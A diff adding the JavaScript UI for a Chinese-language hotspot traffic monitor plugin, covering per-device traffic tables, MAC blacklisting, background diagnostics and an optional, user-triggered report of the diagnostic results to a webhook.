+        <td class="ht-td-num ht-total" data-ht="tf">${renderTrafficRateCell(device, totalBytes, txBytes, rxBytes)}</td>
+      </tr>`;
+    };
+
+    const showDeviceModal = async (mac, displayName, ip) => {
+        const _r = await run(`timeout 1s ${sq(JQ)} -r --arg m ${sq(mac)} '.[$m] // {"type":"normal"}' ${sq(POLICY_FILE)} 2>/dev/null || echo '{"type":"normal"}'`);
+        let curPolicy = {type: 'normal'};
+        try { curPolicy = JSON.parse((_r?.content || '').trim()); } catch (e) { console.warn('[HT] parse policy json failed:', e, _r?.content); }
+        const curPol = curPolicy.type || 'normal';
+        const customName = getCustomName(mac) || '';
+        const masked = maskMac(mac);
+        const content = `
+      <div style="font-size:.72rem;color:#94a3b8;margin-bottom:10px;display:flex;align-items:center;gap:6px;flex-wrap:wrap">
+        <b style="color:#e2e8f0">${esc(displayName || '未知设备')}</b>
+        <span>${esc(ip || '')}</span>
+        <span class="ht-mac-toggle" style="cursor:pointer;color:#64748b;border-bottom:1px dashed #475569" data-masked="${esc(masked)}" data-full="${esc(mac)}">${esc(masked)}</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:6px;margin-bottom:10px">
+        <input type="text" id="ht_dev_name" value="${esc(customName)}" placeholder="${esc(displayName)}" style="flex:1;padding:6px 10px;background:#1e2030;border:1px solid #334155;border-radius:5px;color:#e2e8f0;font-size:.7rem;outline:none">
+        <button id="ht_dev_name_clear" style="padding:5px 10px;font-size:.62rem;border:1px solid #334155;border-radius:5px;background:transparent;color:#94a3b8;cursor:pointer">清除</button>
+      </div>
+      ${!customName && (!displayName || displayName === '未知设备') ? '<div style="font-size:.54rem;color:#64748b;line-height:1.4;margin:-4px 0 6px">\u{1F4A1} 设备重新连接WiFi后可自动识别名称，也可在上方手动设置</div>' : ''}
+      <div style="border-top:1px solid #1e293b;margin:10px 0"></div>
+      <div style="display:flex;flex-direction:column;gap:8px;font-size:.7rem;color:#e2e8f0">
+        <label style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="radio" name="pol" value="normal" ${curPol==='normal'?'checked':''} style="accent-color:#667eea"> 正常（无限制）</label>
+        <label style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="radio" name="pol" value="blacklist" ${curPol==='blacklist'?'checked':''} style="accent-color:#667eea"> 拉黑（禁止联网）</label>
+      </div>`;
+        const { id, el } = createModal({
+            name: 'ht_device_modal',
+            title: '热点流量监控 · 设备管理',
+            content,
+            showConfirm: true,
+            confirmBtnText: '应用',
+            onClose: () => true,
+            onConfirm: async () => {
+                const newName = el.querySelector('#ht_dev_name')?.value?.trim() || '';
+                const type = el.querySelector('input[name="pol"]:checked')?.value;
+                let policyOk = true;
+                if (type === 'normal') {
+                    const r = await policyRemove(mac);
+                    if (!r?.success) policyOk = false;
+                } else if (type) {
+                    const r = await policySet(mac, type);
+                    if (!r?.success) policyOk = false;
+                }
+                if (!policyOk) {
+                    createToast('策略保存失败，请稍后重试', 'red', 3000);
+                    return false;
+                }
+                await loadPolicyMap();
+                setCustomName(mac, newName);
+                patchDataArea();
+                return true;
+            }
+        });
+        const macEl = el.querySelector('.ht-mac-toggle');
+        if (macEl) macEl.onclick = () => { macEl.textContent = macEl.textContent === macEl.dataset.full ? macEl.dataset.masked : macEl.dataset.full; };
+        el.querySelector('#ht_dev_name_clear')?.addEventListener('click', () => { el.querySelector('#ht_dev_name').value = ''; });
+        showModal(id);
+    };
+
+    const renderUlDl = (tx, rx) => `<div style="font-size:.62rem;opacity:.75;white-space:nowrap;margin-top:2px;"><span class="ht-up">↑${esc(htFormatBytes(tx))}</span> <span class="ht-down">↓${esc(htFormatBytes(rx))}</span></div>`;
+
+    const renderDataArea = () => {
+        const installed = state.installed;
+        const devicesMap = (state.dataCache && state.dataCache.devices) ? state.dataCache.devices : {};
+        const deviceList = sortDevices(devicesMap);
+        const summary = state.summary;
+        const dataDate = (state.dataCache && state.dataCache.date) || new Date().toISOString().slice(0, 10);
+
+        let summaryHtml;
+        if (summary) {
+            const m = calcSummaryMetrics(summary, deviceList);
+            const zeroWarn = (summary.zeroStreak >= 3 && installed) ? `<div class="ht-status-alert" style="font-size:.55rem;margin-top:4px;">热点合计持续为0，可能受硬件加速影响，建议点击「诊断」排查</div>` : '';
+            summaryHtml = `<div class="ht-summary-grid">
+${summaryHtmls(m).map((html, i) => `<div class="ht-summary-item" data-ht="si_${i}">${html}</div>`).join('\n')}
+            </div>${zeroWarn}`;
+        } else {
+            summaryHtml = `<div class="ht-empty" style="font-size:.58rem;">${installed ? '已启用，等待首次采集数据' : '启用并等待首次采集后显示'}</div>`;
+        }
+
+        const devicesHtml = deviceList.length > 0
+            ? `<div class="ht-tbl-wrap"><table class="ht-tbl">
+                <thead><tr><th style="width:10px;text-align:center;">#</th><th style="width:20px;">操作</th><th style="width:49%;">设备</th><th class="ht-td-num">Σ 流量 · 网速</th></tr></thead>
+                <tbody>${deviceList.map((d, i) => renderDeviceRow(d, i)).join('')}</tbody>
+               </table></div>`
+            : `<div class="ht-empty">${installed ? '已启用，等待首次采集到接入设备...' : '启用后开始统计各接入设备的流量'}</div>`;
+
+        const updatedShort = state.lastUpdated ? state.lastUpdated.slice(11, 19) : '';
+
+        return `
+        <div class="ht-card">
+          <div class="ht-row" style="justify-content:space-between;margin-bottom:8px;flex-wrap:wrap;gap:6px;">
+            <div class="ht-row" style="font-size:.82rem;font-weight:700;gap:8px;"><span style="font-size:.88rem;">📋</span> 流量概览<span class="ht-date">${esc(dataDate)}<span data-ht="sum_date">${installed && updatedShort ? `（更新 ${esc(updatedShort)}）` : ''}</span></span></div>
+            <button id="ht_devices_toggle" class="ht-btn ht-btn-ghost" style="font-size:.7rem;padding:5px 12px;">${localStorage.getItem('hotspot_traffic_devices_collapsed') === '1' ? '设备明细 ▼' : '设备明细 ▲'}</button>
+          </div>
+          ${summaryHtml}
+        </div>
+        <div class="ht-card" id="ht_devices_card" style="${localStorage.getItem('hotspot_traffic_devices_collapsed') === '1' ? 'display:none' : ''}">
+          ${devicesHtml}
+        </div>`;
+    };
+
+    const render = () => {
+        const installed = state.installed;
+        const statusEmoji = installed ? '🟢' : '⚪';
+        const statusText = installed ? '运行中' : '未启用';
+        const toggleCls = installed ? 'ht-btn-stop' : 'ht-btn-success';
+        const toggleTxt = installed ? '⏹ 停用' : '▶ 启用';
+        const diagBtnText = state.diagStatus === 'done' ? '🔧 诊断结果' : state.diagStatus === 'running' ? '🔧 诊断中...' : '🔧 诊断';
+        const _remoteVer = _manifest?.version || '';
+        const _devVer = state._deviceVersion;
+        const _verDisplay = state.installed ? (_devVer || '') : _remoteVer;
+        const _hasUpdate = _remoteVer && _devVer && _remoteVer !== _devVer;
+        const _updateBtnHtml = ''; // 【原更新按钮已删除】
+        const _verHtml = _verDisplay ? `<span id="ht-ver-tap" style="font-size:.66rem;opacity:.4;margin-left:6px;cursor:pointer;-webkit-user-select:none;user-select:none;">v${esc(_verDisplay)}</span>${_updateBtnHtml}` : '';
+
+        return `<div class="ht-wrap">
+        <div class="ht-card">
+          <div class="ht-row" style="justify-content:space-between;">
+            <div class="ht-row" style="font-size:.92rem;font-weight:800;background:linear-gradient(90deg,#a78bfa,#c4b5fd,#e0e7ff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;">📊 热点流量监控</div>
+            <span id="ht_clock" class="ht-date" style="font-size:.72rem;font-weight:600;"></span>
+          </div>
+          <div class="ht-row" style="justify-content:space-between;margin-top:6px;flex-wrap:wrap;gap:6px;">
+            <div class="ht-row" style="font-size:.78rem;gap:6px;"><span style="font-size:.85rem;">${statusEmoji}</span><span style="font-weight:600;">${esc(statusText)}</span>${_verHtml}</div>
+            <div class="ht-row" style="gap:6px;flex-wrap:wrap;">
+              <button class="ht-btn ht-btn-ghost" data-act="log" ${installed ? '' : 'disabled'}>📋 日志</button>
+              <button class="ht-btn ht-btn-ghost" data-act="diag" ${installed ? '' : 'disabled'}>${diagBtnText}</button>
+              <button class="ht-btn ${toggleCls}" data-act="toggle">${toggleTxt}</button>
+            </div>
+          </div>
+        </div>
+        <div id="ht_data_area">${renderDataArea()}</div>
+      </div>`;
+    };
+
+    // ─── diag ─────────────────────────────────────────────────────────────────
+    const clearDiagState = () => {
+        state.diagStatus = 'idle';
+        state.diagResult = null;
+    };
+
+    const updateDiagBtn = () => {
+        const btn = document.querySelector(`#${MODAL} [data-act="diag"]`);
+        if (!btn) return;
+        btn.textContent = state.diagStatus === 'done' ? '🔧 诊断结果' : state.diagStatus === 'running' ? '🔧 诊断中...' : '🔧 诊断';
+    };
+
+    const startDiag = async () => {
+        if (!state.installed) return createToast('请先启用插件', 'pink');
+        if (state.diagStatus === 'running') return;
+        state.diagStatus = 'running';
+        updateDiagBtn();
+        const _resetDiag = () => { state.diagStatus = 'idle'; updateDiagBtn(); };
+        try { await readStatus(); } catch (e) { state.summary = null; console.warn('[HT] readStatus in diag:', e); }
+        if (state.summary && state.summary.scriptStartAt) {
+            const startMs = parseTs(state.summary.scriptStartAt);
+            if (!Number.isFinite(startMs)) { _resetDiag(); return createToast('插件数据尚未就绪，请等待采集完成后再诊断', 'pink'); }
+            const elapsed = Date.now() - startMs;
+            if (elapsed < DIAG_COOLDOWN) {
+                const sec = Math.floor(elapsed / 1000);
+                const t = sec >= 60 ? `${Math.floor(sec / 60)}分${sec % 60 ? sec % 60 + '秒' : ''}` : `${sec}秒`;
+                _resetDiag();
+                return createToast(`插件当前启动${t}，请等待至少5分钟后再诊断`, 'pink');
+            }
+        } else if (!state.summary) {
+            _resetDiag();
+            return createToast('插件数据尚未就绪，请等待采集完成后再诊断', 'pink');
+        }
+        const now = new Date();
+        if (now.getHours() === 0 && now.getMinutes() === 0) { _resetDiag(); return createToast('跨日数据重建中，请1分钟后再诊断', 'pink'); }
+        const preChk = await run(`_probe=0; [ -f ${sq(DIAG_BIN_FILE)} ] && _probe=1
+_lock=0; _stale=0; if [ -f ${sq(DIAG_LOCK_FILE)} ]; then _age=$(( $(date +%s) - $(stat -c %Y ${sq(DIAG_LOCK_FILE)} 2>/dev/null || echo 0) )); if [ "$_age" -gt 60 ]; then rm -f ${sq(DIAG_LOCK_FILE)}; _stale=1; else _p=$(awk '{print}' ${sq(DIAG_LOCK_FILE)} 2>/dev/null); [ -n "$_p" ] && kill -0 "$_p" 2>/dev/null && _lock=1 || rm -f ${sq(DIAG_LOCK_FILE)}; fi; fi
+_ver=$(timeout 2s awk '{print}' ${sq(DATA_DIR + '/.version')} 2>/dev/null)
+echo "$_probe|$_lock|$_stale|$_ver"`, 8000);
+        const [_probeOk, _lockAlive, _stale, _instVer] = String(preChk?.content || '').trim().split('|');
+        if (_probeOk !== '1') { _resetDiag(); return createToast('诊断脚本未就绪，请停用后重新启用插件', 'pink'); }
+        if (_lockAlive === '1') { _resetDiag(); return createToast('诊断正在进行中，请等待完成', 'pink'); }
+        if (_stale === '1') createToast('检测到残留锁文件已清理，正在重新诊断...', 'green', 2000);
+        const currentVer = state._deviceVersion || '';
+        if (_instVer && currentVer && _instVer.trim() !== currentVer) { _resetDiag(); return createToast(`插件已更新(${currentVer})，请重新启用插件以生效`, 'pink', 5000); }
+        const { close: closeLoading } = createFixedToast('ht_diag_loading', '诊断中...');
+        await run(`rm -f ${sq(DIAG_RESULT_FILE)} 2>/dev/null
+cp ${sq(DIAG_BIN_FILE)} ${DIAG_PROC} && chmod 755 ${DIAG_PROC} && nohup ${DIAG_PROC} >/dev/null 2>&1 &`, 15000);
+        closeLoading();
+        createToast('诊断已启动，后台执行中...', 'green', 2000);
+        const _diagPoll = setInterval(async () => {
+            try {
+                const dr = await run(`[ -s ${sq(DIAG_RESULT_FILE)} ] && echo __DONE__ || echo __WAIT__`, 3000);
+                if (String(dr?.content || '').includes('__DONE__')) {
+                    clearInterval(_diagPoll);
+                    const dtxt = await run(`timeout 3s awk '{print}' ${sq(DIAG_RESULT_FILE)} 2>/dev/null`, 5000);
+                    const dc = String(dtxt?.content || '').trim();
+                    if (dc) {
+                        try {
+                            state.diagResult = JSON.parse(dc);
+                            state.diagStatus = 'done';
+                            updateDiagBtn();
+                            createToast('诊断完成', 'green', 2000);
+                        } catch {}
+                    }
+                }
+            } catch {}
+        }, 3000);
+        setTimeout(() => {
+            clearInterval(_diagPoll);
+            if (state.diagStatus === 'running') {
+                state.diagStatus = 'idle';
+                updateDiagBtn();
+                createToast('诊断超时或失败，请稍后重试', 'pink');
+            }
+        }, 95000);
+    };
+
+    let _lastReportTime = 0;
+
+    const showDiagResult = () => {
+        if (!state.diagResult) return createToast('暂无诊断结果', 'pink');
+        const j = state.diagResult;
+        const hasIssue = Array.isArray(j.checks) && j.checks.some(c => !c.startsWith('\u2713') && !c.startsWith('\u2139'));
+        const reportStatus = j.auto_reported ? '<span style="color:#4ade80">\u2714 \u5df2\u4e0a\u62a5</span>'
+            : !hasIssue ? '<span style="opacity:.4">\u65e0\u5f02\u5e38\uff0c\u65e0\u9700\u4e0a\u62a5</span>'
+            : '<span style="color:#93c5fd">\u2191 \u5efa\u8bae\u4e0a\u62a5</span>';
+        let html = '';
+
+        if (Array.isArray(j.checks)) {
+            html += `<div style="margin-bottom:6px;display:flex;align-items:baseline;justify-content:space-between"><span><b>检查项</b>${j.timestamp ? `<span style="font-size:.5rem;opacity:.45;margin-left:6px">${esc(j.timestamp)}</span>` : ''}</span><span style="font-size:.5rem">${reportStatus}</span></div>`;
+            j.checks.forEach(c => {
+                const idx1 = c.indexOf(':');
+                const idx2 = c.indexOf(':', idx1 + 1);
+                const sym = c.substring(0, idx1);
+                const id = c.substring(idx1 + 1, idx2);
+                const detail = c.substring(idx2 + 1);
+                const color = sym === '\u2713' ? '#86efac' : sym === '!' ? '#fdba74' : sym === '\u2139' ? '#9ca3af' : '#fca5a5';
+                html += `<div class="ht-diag-item"><span style="color:${color};margin-right:2px">${sym}</span><span style="font-weight:600">${esc(id)}</span><span style="opacity:.4">: </span><span style="opacity:.55">${esc(detail)}</span></div>`;
+            });
+        }
+
+        const text = JSON.stringify(j);
+        const diagVer = j.version || state._deviceVersion || '';
+        const { el: toastEl, close } = createFixedToast('ht_diag_result_toast', `<div style="pointer-events:all;width:92vw;max-width:420px;max-height:75vh;display:flex;flex-direction:column"><div class="title" style="margin:0 0 6px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between">诊断结果<span style="font-size:.5rem;opacity:.35;margin-left:6px;font-weight:400">v${esc(diagVer)}</span>${qqBtnHtml('ht_diag_qq')}</div>${(_manifest && _manifest.version && _manifest.version !== state._deviceVersion) ? '<div id="ht-diag-upd-banner" style="display:flex;align-items:center;justify-content:space-between;border:1px solid rgba(34,197,94,.4);background:rgba(34,197,94,.12);color:#86efac;border-radius:8px;padding:8px 10px;margin:0 0 6px;cursor:pointer;font-size:.55rem"><span>发现新版本 v' + esc(_manifest.version) + '，点此查看</span><span style="opacity:.7">›</span></div>' : ''}<div style="flex:1;overflow:auto;min-height:0">${html}</div><div style="display:flex;gap:6px;justify-content:flex-end;flex-wrap:wrap;margin-top:6px;padding-top:6px;border-top:1px solid rgba(255,255,255,.08);flex-shrink:0"><button id="ht_diag_copy" class="ht-btn ht-btn-success" style="font-size:.62rem">复制报告</button><button id="ht_diag_report" class="ht-btn ht-btn-ghost" style="font-size:.62rem">上报</button><button id="ht_diag_redo" class="ht-btn ht-btn-ghost" style="font-size:.62rem">重新诊断</button><button id="ht_diag_close" class="ht-btn ht-btn-ghost" style="font-size:.62rem">关闭</button></div></div>`);
+        toastEl.querySelector('#ht_diag_close').onclick = () => close();
+        const _updBanner = toastEl.querySelector('#ht-diag-upd-banner');
+        if (_updBanner) { _updBanner.onclick = () => { close(); }; }
+        toastEl.querySelector('#ht_diag_copy').onclick = async () => {
+            await copyToClipboard(text);
+            createToast('已复制', 'green');
+        };
+        toastEl.querySelector('#ht_diag_report').onclick = async () => {
+            if (!hasIssue) return groupTip('诊断结果无异常，如有问题请加群反馈（群号已复制）', 'pink', 3000);
+            const markReported = async () => {
+                const _sec = Math.floor(Date.now() / 1000);
+                await run(`printf '%s' ${sq(_sec)} > ${sq(LAST_REPORT_TS_FILE)}
+_m=$(${sq(JQ)} '.auto_reported=true' ${sq(DIAG_RESULT_FILE)} 2>/dev/null); [ -n "$_m" ] && printf '%s' "$_m" > ${sq(DIAG_RESULT_FILE + '.tmp')} && mv ${sq(DIAG_RESULT_FILE + '.tmp')} ${sq(DIAG_RESULT_FILE)}`, 5000);
+                _lastReportTime = _sec * 1000;
+                j.auto_reported = true;
+            };
+            const _st = await run(`_ts=$(awk '{print $1+0}' ${sq(LAST_REPORT_TS_FILE)} 2>/dev/null); _ar=$(awk '/auto_reported/{c=1} END{print c+0}' ${sq(DIAG_RESULT_FILE)} 2>/dev/null); echo "ts=$_ts ar=$_ar"`, 3000);
+            const _out = String(_st?.content || '');
+            const _tsm = _out.match(/ts=(\d+)/);
+            const _fts = _tsm ? parseInt(_tsm[1]) : 0;
+            if (_fts) _lastReportTime = Math.max(_lastReportTime, _fts * 1000);
+            const autoReported = j.auto_reported || _out.includes('ar=1');
+            if (autoReported) return groupTip('当前诊断已上报，请加群跟进（群号已复制）', 'green', 3000);
+            if (_lastReportTime && Date.now() - _lastReportTime < REPORT_COOLDOWN) return groupTip(`上报间隔未达${Math.round(REPORT_COOLDOWN / 60000)}分钟，请稍后重新诊断或加群跟进（群号已复制）`, 'pink');
+            try {
+                const whRes = await run(`cat ${sq(WEBHOOK_FILE)} 2>/dev/null`, 3000);
+                const webhookUrl = String(whRes?.content || '').trim();
+                if (!webhookUrl) return groupTip('未获取到上报通道，请加群反馈（群号已复制）', 'red');
+                const body = JSON.stringify({msgtype: 'text', text: {content: text}});
+                const tmpFile = `${DATA_DIR}/_report.tmp`;
+                const r = await run(`printf '%s' ${sq(body)} > ${sq(tmpFile)} && _r=$(timeout 10s curl -s -X POST -H 'Content-Type: application/json;charset=UTF-8' -d @${sq(tmpFile)} ${sq(webhookUrl)} 2>/dev/null) && rm -f ${sq(tmpFile)} && echo "$_r" || { rm -f ${sq(tmpFile)}; echo '{"errcode":-1}'; }`, 15000);
+                const output = String(r?.content || '').trim();
+                if (output.includes('"errcode":0') || output.includes('"errcode": 0')) {
+                    await markReported();
+                    return groupTip('上报成功，可加群跟进（群号已复制）', 'green');
+                } else if (output.includes('310000')) {
+                    return groupTip('当前插件版本过旧，请更新到最新版本后重试或加群反馈（群号已复制）', 'red', 5000);
+                } else {
+                    return groupTip('上报失败，请加群反馈（群号已复制）', 'red');
+                }
+            } catch {
+                return groupTip('上报失败，请加群反馈（群号已复制）', 'red');
+            }
+        };
+        toastEl.querySelector('#ht_diag_qq').onclick = () => groupTip('群号已复制', 'green');
+        toastEl.querySelector('#ht_diag_redo').onclick = async () => { close(); await startDiag(); };
+    };
+
+    const restoreDiagState = async () => {
+        const r = await run(`echo __TS__
+awk '{print $1+0}' ${sq(LAST_REPORT_TS_FILE)} 2>/dev/null
+echo __RESULT__
+[ -s ${sq(DIAG_RESULT_FILE)} ] && timeout 3s awk '{print}' ${sq(DIAG_RESULT_FILE)} 2>/dev/null || echo`, 5000);
+        const text = String(r?.content || '');
+        const _tsStr = text.includes('__TS__') ? text.split('__TS__')[1].split('__RESULT__')[0].trim() : '';
+        const _fts = parseInt(_tsStr) || 0;
+        if (_fts) _lastReportTime = Math.max(_lastReportTime, _fts * 1000);
+        const resultStr = text.includes('__RESULT__') ? text.split('__RESULT__')[1].trim() : '';
+        if (resultStr) {
+            try {
+                state.diagResult = JSON.parse(resultStr);
+                state.diagStatus = 'done';
+            } catch { state.diagStatus = 'idle'; state.diagResult = null; }
+        } else {
+            state.diagStatus = 'idle';
+            state.diagResult = null;
+        }
+    };
+
+    // ─── bind ─────────────────────────────────────────────────────────────────
+    const initDataDelegate = () => {
+        if (_dataEvtBound) return;
+        const area = document.querySelector(`#${MODAL} #ht_data_area`);
+        if (!area) return;
+        _dataEvtBound = true;
+        area.addEventListener('click', (e) => {
+            const toggleBtn = e.target.closest('#ht_devices_toggle');
+            if (toggleBtn) {
+                e.stopPropagation();
+                const card = document.querySelector(`#${MODAL} #ht_devices_card`);
+                if (!card) return;
+                const isCollapsed = card.style.display === 'none';
+                card.style.display = isCollapsed ? '' : 'none';
+                toggleBtn.textContent = isCollapsed ? '设备明细 ▲' : '设备明细 ▼';
+                localStorage.setItem('hotspot_traffic_devices_collapsed', isCollapsed ? '0' : '1');
+                return;
+            }
+            const macSpan = e.target.closest('[data-full-mac]');
+            if (macSpan) {
+                e.stopPropagation();
+                const full = macSpan.dataset.fullMac || '';
+                const masked = macSpan.dataset.masked === '1';
+                if (masked) { macSpan.textContent = full; macSpan.dataset.masked = '0'; macSpan.title = '点击隐藏部分 MAC'; }
+                else { macSpan.textContent = maskMac(full); macSpan.dataset.masked = '1'; macSpan.title = '点击查看完整 MAC'; }
+                return;
+            }
+            const editBtn = e.target.closest('[data-edit-mac]');
+            if (editBtn) {
+                e.stopPropagation();
+                const mac = editBtn.dataset.editMac;
+                const row = editBtn.closest('tr');
+                const nameEl = row?.querySelector('[data-ht="name"]');
+                const ipEl = row?.querySelector('[data-ht="ip"]');
+                const displayName = nameEl?.textContent?.replace(/\s*\(我\)$/, '') || '';
+                const ip = ipEl?.textContent || '';
+                showDeviceModal(mac, displayName, ip);
+            }
+
+        });
+    };
+
+    const renderIntoPanel = () => {
+        const box = document.querySelector(`#${MODAL} .collapse_box`);
+        if (!box) return;
+        _dataEvtBound = false;
+        box.innerHTML = render();
+        bind(document.querySelector(`#${MODAL}`));
+    };
+
+    let _verTapCount = 0, _verTapTimer = null, _updating = false;
+
+    const performUpdate = async (progress = () => {}) => {
+        let curStep = 'manifest';
+        try {
+            progress('manifest', 'running');
+            if (!_manifest) {
+                const raw = await fetchManifestWithProbe('v' + state._deviceVersion + '.json');
+                if (!raw) throw htErr('无法获取版本信息', _lastManifestErr);
+                _manifest = parseManifest(raw);
+                if (!_manifest) throw htErr('版本信息格式异常');
+            }
+            progress('manifest', 'done');
+
+            curStep = 'dl_deploy';
+            progress('dl_deploy', 'running');
+            const deployBin = await downloadDeployScript(_manifest.deployUrl, progress);
+            progress('dl_deploy', 'done');
+
+            curStep = 'deploy';
+            await executeDeploy(deployBin, _manifest, state._deviceVersion || '', progress);
+
+            await run(`rm -f ${sq(DIAG_RESULT_FILE)} ${sq(DATA_DIR + '/diag_state.txt')} ${sq(LAST_REPORT_TS_FILE)} ${sq(DIAG_LOCK_FILE)} 2>/dev/null`);
+            clearDiagState();
+            state._deviceVersion = _manifest.version;
+            progress('complete', 'done');
+        } catch (e) {
+            if (!e.htStep) e.htStep = curStep;
+            throw e;
+        }
+    };
+
+    const showUpdateConfirm = (newVer, notes) => {
+        return new Promise((resolve) => {
+            const notesHtml = (notes && notes.trim()) ? esc(notes.trim()) : '（本次更新暂无说明）';
+            const { el, close } = createFixedToast('ht_update_confirm', `<div style="pointer-events:all;width:88vw;max-width:400px"><div class="title" style="margin:0 0 8px">热点流量监控 · 发现新版本 v${esc(newVer)}</div><div style="font-size:.58rem;line-height:1.6;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.1);border-radius:6px;padding:8px 10px;max-height:40vh;overflow-y:auto;white-space:pre-wrap;word-break:break-word;">${notesHtml}</div><div style="display:flex;gap:8px;justify-content:flex-end;margin-top:10px"><button id="ht_upd_cancel" style="font-size:.62rem;padding:5px 14px;border-radius:7px;border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.06);color:inherit;cursor:pointer;">取消</button><button id="ht_upd_ok" style="font-size:.62rem;padding:5px 14px;border-radius:7px;border:1px solid rgba(34,197,94,.4);background:rgba(34,197,94,.25);color:#86efac;cursor:pointer;">确认更新</button></div></div>`);
+            let done = false;
+            const finish = (v) => { if (done) return; done = true; close(); resolve(v); };
+            el.querySelector('#ht_upd_cancel').onclick = () => finish(false);
+            el.querySelector('#ht_upd_ok').onclick = () => finish(true);
+        });
+    };
+
+    // 【原热点流量监控更新机制已删除】更新功能由主插件统一管理
+    const performUpdateFlow = async () => { return; };
+    const handleUpdateClick = async () => { return; };
+
+    const bind = (el) => {
+        if (!el) return;
+        const toggleBtn = el.querySelector('[data-act="toggle"]');
+        if (toggleBtn) toggleBtn.onclick = async (e) => {
+            const btn = e.currentTarget;
+            if (btn.disabled) return;
+            if (state.installed) { showUninstallConfirm(); return; }
+            btn.disabled = true;
+            try {
+                const probeR = await run(`_p=$(timeout 1s awk '{print}' ${sq(PID_FILE)} 2>/dev/null); [ -n "$_p" ] && kill -0 "$_p" 2>/dev/null && echo __ALIVE__ || echo __DEAD__`, 5000);
+                if (String(probeR?.content || '').includes('__ALIVE__')) {
+                    await run(`grep -qxF ${sq(BOOT_LINE)} ${sq(BOOT_SH_FILE)} || echo ${sq(BOOT_LINE)} >> ${sq(BOOT_SH_FILE)}`);
+                    await readStatus();
+                    if (state.installed) await loadData();
+                    renderIntoPanel();
+                    if (state.installed) setAutoData(true);
+                    createToast('插件已在后台运行，已刷新状态', 'green');
+                } else {
+                    await startInstallFlow();
+                }
+            } catch (err) {
+                createToast('操作异常：' + (err && err.message ? err.message : String(err)), 'red');
+            } finally { btn.disabled = false; }
+        };
+        const logBtn = el.querySelector('[data-act="log"]');
+        if (logBtn) logBtn.onclick = (e) => { e.stopPropagation(); showLogPopup(); };
+        const diagBtn = el.querySelector('[data-act="diag"]');
+        if (diagBtn) diagBtn.onclick = async (e) => {
+            e.stopPropagation();
+            if (state.diagStatus === 'done') { showDiagResult(); return; }
+            if (state.diagStatus === 'idle') { await startDiag(); return; }
+        };
+        initDataDelegate();
+
+        const verEl = el.querySelector('#ht-ver-tap');
+        if (verEl) {
+            verEl.onclick = () => { handleUpdateClick(); };
+        }
+        const updateBtn = el.querySelector('#ht-update-btn');
+        if (updateBtn) {
+            updateBtn.onclick = (e) => { e.stopPropagation(); handleUpdateClick(); };
+        }
+        const clockEl = el.querySelector('#ht_clock');
+        if (clockEl) {
+            if (_clockTimer) { clearInterval(_clockTimer); _clockTimer = null; }
+            const updClock = () => {
+                const c = document.querySelector(`#${MODAL} #ht_clock`);
+                if (c) c.textContent = new Date().toLocaleTimeString('zh-CN', {hour12:false});
+                else { if (_clockTimer) { clearInterval(_clockTimer); _clockTimer = null; } }
+            };
+            updClock();
+            _clockTimer = setInterval(updClock, 1000);
+        }
+    };
+
+    // ─── help ─────────────────────────────────────────────────────────────────
+    const HELP_TEXT = `<b>功能</b><br>统计热点接入设备的流量，每天 0 点自动重置。<br><br><b>流量概览</b><br>系统增量 = 插件启用后或今日开始的系统总流量；热点合计 = 热点转发的流量；偏差 = 两者之差，主UFI本机进程流量和可能的硬件加速偏差。未归属 = 热点合计与设备合计的差值，通常占比较小。<br><br><b>设备明细</b><br>按设备展示上传/下载流量。点击设备右侧 ⚙ 可设置自定义名称或拉黑策略。<br><br><b>诊断</b><br>检测常见问题，可一键上报诊断结果给作者分析。`;
+
+    const showHelp = () => {
+        const { el, close } = createFixedToast('ht_help_toast', `<div style="pointer-events:all;width:80vw;max-width:300px"><div class="title" style="margin:0;display:flex;align-items:center;justify-content:space-between">使用说明${qqBtnHtml('ht_help_qq')}</div><div style="margin:10px 0;font-size:.64rem;line-height:1.6">${HELP_TEXT}</div><div style="text-align:right"><button style="font-size:.62rem" id="ht_help_dismiss">关闭</button></div></div>`);
+        el.querySelector('#ht_help_qq').onclick = () => groupTip('群号已复制', 'green');
+        el.querySelector('#ht_help_dismiss').onclick = () => close();
+    };
+
+    const injectHelpButton = (container) => {
+        const titleEl = container.querySelector('.title strong');
+        if (!titleEl) return;
+        const helpBtn = document.createElement('button');
+        helpBtn.textContent = '?';
+        helpBtn.style.cssText = 'width:16px;height:16px;border-radius:50%;padding:0;font-size:.5rem;line-height:16px;text-align:center;cursor:pointer;border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.08);color:rgba(255,255,255,.7);margin-left:8px;vertical-align:middle;flex-shrink:0;';
+        helpBtn.onclick = (e) => { e.stopPropagation(); showHelp(); };
+        titleEl.insertAdjacentElement('afterend', helpBtn);
+    };
+
+    // ─── mount ────────────────────────────────────────────────────────────────
+    ensureStyle();
+    const getPluginRoot = () => {
+        let root = document.getElementById('kano_plugin_panels');
+        if (!root) {
+            root = document.createElement('div');
+            root.id = 'kano_plugin_panels';
+            root.style.width = '100%';
+            const devMon = document.querySelector('.devices-mon');
+            if (!devMon) return null;
+            devMon.insertAdjacentElement('beforebegin', root);
+        }
+        return root;
+    };
+    const pluginRoot = getPluginRoot();
+    if (!pluginRoot) return;
+    pluginRoot.insertAdjacentHTML('beforeend', `
+        <div id="${MODAL}" style="width:100%;margin-top:10px;">
+            <div class="title" style="margin:8px 0;">
+                <strong style="font-size:.92rem;background:linear-gradient(90deg,#a78bfa,#c4b5fd,#e0e7ff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;">📊 热点流量监控</strong>
+                <div style="display:inline-block;" id="collapse_ht_btn"></div>
+            </div>
+            <div class="collapse" id="collapse_ht" data-name="close" style="height:0;overflow:hidden;">
+                <div class="collapse_box"></div>
+            </div>
+        </div>
+    `);
+
+    const panelEl = document.querySelector(`#${MODAL}`);
+    injectHelpButton(panelEl);
+
+    const checkUpdateInBackground = () => {
+        // 【原热点流量监控更新机制已删除】更新功能由主插件统一管理
+        return;
+    };
+
+    const initPanelState = async () => {
+        await readStatus();
+        if (!state.installed) {
+            const bootChk = await run(`grep -q ${sq(NAME)} ${sq(BOOT_SH_FILE)} 2>/dev/null && echo 1 || echo 0`, 3000);
+            if (String(bootChk?.content || '').includes('1')) {
+                await wait(800);
+                await readStatus();
+            }
+        }
+        await recoverDaemonOnce();
+        await restoreDiagState();
